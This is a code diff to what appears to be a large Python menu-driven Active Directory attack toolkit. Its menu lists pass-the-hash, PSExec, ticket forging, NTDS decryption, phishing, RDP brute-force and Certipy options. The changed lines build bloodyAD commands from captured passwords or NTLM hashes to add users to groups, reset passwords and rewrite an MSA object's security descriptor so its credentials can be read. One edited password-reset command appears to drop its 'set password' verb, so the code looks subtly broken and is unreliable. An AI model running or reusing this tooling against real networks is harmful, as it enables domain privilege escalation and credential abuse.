@@ -278,7 +278,7 @@ def privCheck():
       print("\n[+] " + ticket + "\n")
       ticket = ticket.rstrip(" ")
       if ticket != "":      
-         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{ticket}.ccache"
+         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{ticket}.ccache".rstrip(" ")
          print(os.environ["KRB5CCNAME"]) 
          print("")
          print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
@@ -845,7 +845,7 @@ def options():
    print('\u2551' + "(06) Set USER   NAME (16) UNALLOCATED    (36) PS  Exec (46) Rpc ClientServ (56) TARGD Roasting (66) Disp  Ticket (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodyADdGroup (705) Certipy 5 (715) Certipy 15 " + '\u2551')
    print('\u2551' + "(07) Set PASS   WORD (17) Set  COMMUNITY (37) SMB Exec (47) Smb ClientServ (57) Pass the  HASH (67) PSExec  HASH (77) SNMP Walker (87)             (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy 6 (716) Certipy 16 " + '\u2551')
    print('\u2551' + "(08) Set NTLM   HASH (18) Set FUZZ RIDER (38) WMI Exec (48) Smb Map SHARES (58) GenTicket HASH (68) SmbExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) ReactivateUser (707) Certipy 7 (717) Certipy 17 " + '\u2551')
-   print('\u2551' + "(09) Set TICKET NAME (19) Set WORD  LIST (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH  (69) WmiExec HASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) Patch  MSAUser (708) Certipy 8 (718) BloodH GUI " + '\u2551')
+   print('\u2551' + "(09) Set TICKET NAME (19) Set WORD  LIST (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH  (69) WmiExec HASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) Patch MSA User (708) Certipy 8 (718) BloodH GUI " + '\u2551')
    print('\u2551' + "(10) Set DOMAIN NAME (20) Set SERVERTIME (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux     (70) STARTSERVERS (80) RemoteShell (90) Rsync Dumps (100) RDPBrute (240) Run LineCommand (350) HTTP Git  Dumper (450)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
@@ -1674,7 +1674,7 @@ while True:
       TGT = input("[?] Please enter ticket name: ")      
       if TGT != "":
          TGT = spacePadding(TGT, COL1)
-         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{TGT}"
+         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{TGT}".rstrip(" ")
          print("")
          print(os.environ["KRB5CCNAME"]) 
       else:
@@ -2938,7 +2938,7 @@ while True:
       localCOM("echo " + hashTicket + " > " + userAD + ".kirbi") 
       localCOM("cat " + userAD + ".kirbi | tr -d '\n' | base64 -d > " + userAD + "_raw.kirbi")
       localCOM("impacket-ticketConverter " + userAD + "_raw.kirbi " + userAD + ".ccache")
-      os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{userAD}.ccache"
+      os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{userAD}.ccache".rstrip(" ")
       print(os.environ["KRB5CCNAME"]) 
       print("")    
       TGT = spacePadding(userAD + ".ccache", COL1)
@@ -4755,7 +4755,8 @@ while True:
          else:
             remoteCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
          print(colored("[*] Checking downloaded files...\n", colour3))
-         localCOM("ls -la ./" + workDir + "/*.*")
+         localCOM("ls -la ./" + workDir + "/*.* > check.tmp")
+         catsFile("check.tmp")
       prompt()      
 
 # ------------------------------------------------------------------------------------- 
@@ -4800,10 +4801,10 @@ while True:
       AD1 = input("[?] Please enter new group name: ")
       SKEW = timeSync(SKEW)
       if PAS[:2] != "''":
-         localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " add groupMember '" + AD1.rstrip("") + "' " + USR.rstrip(""))
+         localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p " + PAS.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
       else:
           print("[i] Using HASH value as password credential...")    
-          localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p :" + NTM.rstrip("") + " add groupMember '" + AD1.rstrip("") + "' " + USR.rstrip(""))     
+          localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p :" + NTM.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))     
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -4820,10 +4821,10 @@ while True:
       AD2 = input("[?] Please enter new users password: ")
       SKEW = timeSync(SKEW)
       if PAS[:2] != "''":
-         localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))
+         localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
       else:
          print("[i] Using HASH value as password credential...")    
-         localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p :" + NTM.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))      
+         localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "-p :" + NTM.rstrip(" ") + " " + AD1.rstrip(" ") + " " + AD2.rstrip(""))      
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -4936,11 +4937,16 @@ while True:
       AD1 = input("[?] Please enter MSA users name: ")
       AD2 = input("[?] Please enter MSA group mame: ")
       SKEW = timeSync(SKEW)
-      if PAS[:2] != "''":      
-         localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " set object " + AD1.rstrip("") + " " + AD2.rstrip("") + " -v O:SYD:(A;;LCRP;;; O:SYD:(A;;LCRP;;;" + SID.rstrip(" ")) 
+      if PAS[:2] != "''":   
+         try:
+            print("[i] Using -k value as password credential...")
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'") 
+         except:
+            print("[i] Using password credential...")    
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'") 
       else:
          print("[i] Using HASH value as password credential...")    
-         localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p :" + NTM.rstrip("") + " set object " + AD1.rstrip("") + " " + AD2.rstrip("") + " -v O:SYD:(A;;LCRP;;; O:SYD:(A;;LCRP;;;" + SID.rstrip(" "))       
+         localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
